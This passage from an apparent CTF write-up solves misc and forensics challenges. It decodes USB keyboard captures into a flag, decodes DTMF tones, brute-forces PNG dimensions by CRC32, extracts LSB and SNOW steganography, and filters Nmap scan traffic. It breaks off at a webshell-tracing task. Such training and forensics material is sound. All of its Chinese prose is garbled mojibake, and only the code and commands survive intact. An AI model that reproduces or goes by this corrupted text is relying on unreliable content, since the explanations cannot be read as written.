class="string">&quot;02&quot;</span>:</span><br><span class="line">            output += shiftKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += normalKeys[n[<span class="number">2</span>:<span class="number">4</span>]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :n&#x27;</span> + output)</span><br><span class="line"><span class="comment"># å®˜æ–¹è„šæœ¬</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">output :nw3lc0m3&lt;SPACE&gt;to&lt;SPACE&gt;newstar&lt;SPACE&gt;ctf&lt;SPACE&gt;<span class="number">2023</span>&lt;SPACE&gt;flag&lt;SPACE&gt;is&lt;SPACE&gt;here&lt;SPACE&gt;vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888&lt;ESC&gt;&lt;ESC&gt;<span class="number">2</span>hhxgbffffbbbnnat&lt;CAP&gt;&lt;CAP&gt;ff&lt;DEL&gt;lll&lt;DEL&gt;&lt;DEL&gt;aaa&lt;DEL&gt;&lt;DEL&gt;gggg&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#123;<span class="number">999</span>&lt;DEL&gt;&lt;DEL&gt;<span class="number">999</span>&lt;DEL&gt;&lt;DEL&gt;<span class="number">11</span>&lt;DEL&gt;<span class="number">9</span>aaa&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;eb2---&lt;DEL&gt;&lt;DEL&gt;a450---&lt;DEL&gt;&lt;DEL&gt;<span class="number">2f</span>5f&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;--&lt;DEL&gt;<span class="number">7b</span>fc[unknown][unknown][unknown]<span class="number">-8989</span>&lt;DEL&gt;&lt;DEL&gt;dfdf&lt;DEL&gt;&lt;DEL&gt;<span class="number">4b</span>fa4bfa&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;<span class="number">85848584</span>&#125;&#125;&#125;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&#125;]&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;nice&lt;SPACE&gt;work!<span class="number">1</span>yyoou&lt;SPACE&gt;ggot&lt;SPACE&gt;tthhis&lt;SPACE&gt;fllag</span><br></pre></td></tr></table></figure>
<p><code>&lt;DEL&gt;</code>è¡¨ç¤ºåˆ é™¤ï¼Œ<code>&lt;SPACE&gt;</code>è¡¨ç¤ºç©ºæ ¼ï¼Œæ ¹æ®è¿™ä¸ªæŒ‰é”®é¡ºåºå¯¹æ•°æ®è¿›è¡Œå¤„ç†åå¾—åˆ°flagï¼š<code>flag&#123;9919aeb2-a450-2f5f-7bfc-89df4bfa8584&#125;</code></p>
<p><a target="_blank" rel="noopener" href="https://rickliu.com/posts/04d1547e2896/index.html#%E9%94%AE%E7%9B%98%E4%BE%A0">https://rickliu.com/posts/04d1547e2896/index.html#%E9%94%AE%E7%9B%98%E4%BE%A0</a><br>è¿™é‡Œï¼Œæ‘˜ä¸€ä¸ªæ•°æ®å¸¦å†’å·çš„è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;newusbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure>
<h3 id="æ»´æ»´æ»´"><a href="#æ»´æ»´æ»´" class="headerlink" title="æ»´æ»´æ»´"></a>æ»´æ»´æ»´</h3><p>DTMFæ‹¨å·éŸ³ï¼Œå·¥å…·<a target="_blank" rel="noopener" href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">http://aluigi.altervista.org/mytoolz/dtmf2num.zip</a><br>æŠŠéŸ³é¢‘æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œè¿™é‡Œæ‰“å¼€ç»ˆç«¯ï¼Œ<code>dtmf2num.exe å¥‡æ€ªçš„éŸ³é¢‘.wav</code>ï¼Œå¯èƒ½æ‰§è¡Œä¸äº†(æˆ‘çš„å°±æ˜¯)ï¼Œå¯ä»¥æŠŠå®ƒä»¬ä¸¤ä¸ªéƒ½æ‹–è¿›æ¥<br>åœ¨çº¿è¯†åˆ«ï¼Œ<a target="_blank" rel="noopener" href="https://dtmf.netlify.app/">https://dtmf.netlify.app/</a><br>è¿˜æœ‰Pythonè„šæœ¬çš„ï¼Œ<a target="_blank" rel="noopener" href="https://www.cnblogs.com/M0x1n/p/DTMF2num.html">https://www.cnblogs.com/M0x1n/p/DTMF2num.html</a><br>å¾—åˆ°ï¼Œ<code>52563319066</code>ï¼Œè¿˜æœ‰å¼ å›¾ç‰‡æ²¡ç”¨ï¼Œå¤§èƒ†çŒœæµ‹<code>steghide</code><br><code>steghide extract -sf &#39;secret.jpg&#39; -p 52563319066</code></p>
<h2 id="week4-2"><a href="#week4-2" class="headerlink" title="week4"></a>week4</h2><h3 id="Ré€šå¤§æ®‹"><a href="#Ré€šå¤§æ®‹" class="headerlink" title="Ré€šå¤§æ®‹"></a>Ré€šå¤§æ®‹</h3><p>æ‹¿åˆ°å›¾ç‰‡ï¼Œæ„Ÿè§‰å¯èƒ½å®½é«˜ä¸å¯¹ï¼Œæ ¹æ®crc32çˆ†ä¸€ä¸‹å®½é«˜(æ‹–å…¥è™šæ‹Ÿæœºä¹Ÿè¡Œ)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexStr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;49484452&quot;</span>  <span class="comment"># IHDR</span></span><br><span class="line">width = <span class="string">&quot;0x2A&quot;</span></span><br><span class="line">height = <span class="string">&quot;0x00C8&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;0802000000&quot;</span>  <span class="comment"># å®½é«˜åäº”ä¸ªå­—èŠ‚</span></span><br><span class="line">crc32 = <span class="string">&quot;0x112DE485&quot;</span>  <span class="comment"># å†åå››ä¸ªå­—èŠ‚</span></span><br><span class="line">add_num = <span class="number">2000</span>  <span class="comment"># æœ€å¤§å®½é«˜ï¼Œåˆç†ä¿®æ”¹å¿«é€Ÿå‡ºflag</span></span><br><span class="line">bytes1 = hexStr2bytes(str1)</span><br><span class="line">bytes2 = hexStr2bytes(str2)</span><br><span class="line">wid = <span class="built_in">int</span>(width, <span class="number">16</span>)</span><br><span class="line">hei = <span class="built_in">int</span>(height, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid, wid+add_num):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei, hei+add_num):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_temp = hexStr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_temp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_temp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">        <span class="comment"># print(hex(w),hex(h))</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ³¨æ„çœ‹å›¾ç‰‡çš„æœ€ä¸Šé¢æœ‰ä¸œè¥¿ï¼Œä¸€è¡Œè‰²å—<br>lsbéšå†™ï¼Œ<code>zsteg -a secret.png</code>ç«‹é©¬å‡º(æ„Ÿè§‰æ¯”stegsolveæ–¹ä¾¿å•Š)<br><code>stegsolve</code>çš„è¯Ré€šé“å…¨éƒ¨å‹¾ä¸Šï¼Œå…³é—­Ré€šé“ï¼Œä¸æ˜¾ç¤ºçº¢è‰²ï¼ŒRå¤§æ®‹</p>
<p>æˆ–è€…å‚è€ƒä¸€ä¸‹å®˜æ–¹<br>æå–å‡ºç¬¬ä¸€è¡Œåƒç´ è‰²å—çš„RGBå€¼ï¼Œå‘ç°Rå€¼æ˜¯å˜åŒ–çš„ï¼Œå¾ˆæ˜æ˜¾æ˜¯flag</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&quot;secret.png&quot;</span>)</span><br><span class="line">pixels = image.load()</span><br><span class="line">width, height = image.size</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    r, g, b = pixels[x, <span class="number">0</span>]</span><br><span class="line">    flag += <span class="built_in">chr</span>(r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;R=<span class="subst">&#123;r&#125;</span>, G=<span class="subst">&#123;g&#125;</span>, B=<span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>å­¦ä¸€ä¸‹Nmapçš„ç«¯å£æ‰«ææŠ€æœ¯<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41905135/article/details/124541161">https://blog.csdn.net/weixin_41905135/article/details/124541161</a><br>è¿‡æ»¤å‡ºTCP SYNå’ŒACKæ ‡å¿—ä½ä¸º1çš„æ‰€æœ‰æµé‡åŒ…ï¼Œ<code>tcp.flags.syn ==1 &amp;&amp; tcp.flags.ack ==1</code><br><img src="https://pic1.zhimg.com/80/v2-783fb43c89f194a3fa58b2557e10d30c_1440w.png" alt=""><br>æ‰€ä»¥ï¼Œå¼€æ”¾çš„ç«¯å£æ˜¯<code>80,3306,5000,7000,8021,9000</code></p>
<h3 id="ä¾æ—§æ˜¯ç©ºç™½"><a href="#ä¾æ—§æ˜¯ç©ºç™½" class="headerlink" title="ä¾æ—§æ˜¯ç©ºç™½"></a>ä¾æ—§æ˜¯ç©ºç™½</h3><p>è¿™å›¾ç‰‡ä¸€çœ¼å®½é«˜ä¸å¯¹ï¼Œçˆ†ç ´ä¸€ä¸‹å¾—åˆ°é«˜ä¸º<code>04 14</code><br>å¾—åˆ°<code>password: s00_b4by_f0r_y0u</code><br><code>Snowéšå†™</code>ï¼Œä¹‹å‰å¥½åƒpolaræœ‰é“<code>å¼ ä¸‡æ£®ä¸‹é›ªäº†</code>ï¼Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snow æ˜¯ä¸€æ¬¾åœ¨htmlåµŒå…¥éšå†™ä¿¡æ¯çš„è½¯ä»¶ï¼ŒåŸç†æ˜¯é€šè¿‡åœ¨æ–‡æœ¬æ–‡ä»¶çš„æœ«å°¾åµŒå…¥ç©ºæ ¼å’Œåˆ¶è¡¨ä½çš„æ–¹å¼åµŒå…¥éšè—ä¿¡æ¯ï¼Œä¸åŒç©ºæ ¼ä¸åˆ¶è¡¨ä½çš„ç»„åˆä»£è¡¨ä¸åŒçš„åµŒå…¥ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">snowåœ¨asciiæ–‡æœ¬æœ«å°¾éšè—æ•°æ®ï¼Œå¯ä»¥é€šè¿‡æ’å…¥åˆ¶è¡¨ç¬¦å’Œç©ºæ ¼æ˜¯æ•°æ®åœ¨æµè§ˆå™¨ä¸å¯è§</span><br><span class="line">snowæœ€å¤šæ·»åŠ 7ä¸ªç©ºæ ¼ï¼Œä½¿æ¯å…«åˆ—æ’å…¥ä¸‰ä½ï¼Œæ–‡ä»¶ä¸­æœ‰è®¸å¤šåˆ¶è¡¨ç¬¦å’Œç©ºæ ¼</span><br><span class="line">åœ¨çº¿è§£æç½‘é¡µçš„SNOWéšå†™ï¼šhttp://fog.misty.com/perry/ccs/snow/snow/snow.html</span><br><span class="line">SNOWå®˜ç½‘ï¼šThe SNOW Home Page (darkside.com.au)</span><br><span class="line">SNOW.exe ä¸‹è½½ï¼šhttp://darkside.com.au/snow/snwdos32.zip</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://hasegawaazusa.github.io/snow-note.html">https://hasegawaazusa.github.io/snow-note.html</a><br>æ‹–å…¥æœ¬åœ°æ–‡ä»¶å¤¹<br><code>snow.exe -p &quot;s00_b4by_f0r_y0u&quot; -C White.txt</code><br>æˆ‘çš„åˆæ‰§è¡Œä¸äº†ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æ‹–è¿›æ¥æ‰è¡Œ</p>
<h3 id="3-æº¯æº"><a href="#3-æº¯æº" class="headerlink" title="3-æº¯æº"></a>3-æº¯æº</h3><p>éœ€è¦æ‰¾åˆ°ï¼Œæ”»å‡»è€…è·å–åˆ°çš„æœåŠ¡å™¨ç”¨æˆ·åï¼ŒæœåŠ¡å™¨å†…ç½‘IPåœ°å€ï¼ŒåŒæ—¶é¢˜ç›®è¿˜å‘Šè¯‰æˆ‘ä»¬æ˜¯å†°èshell</p>
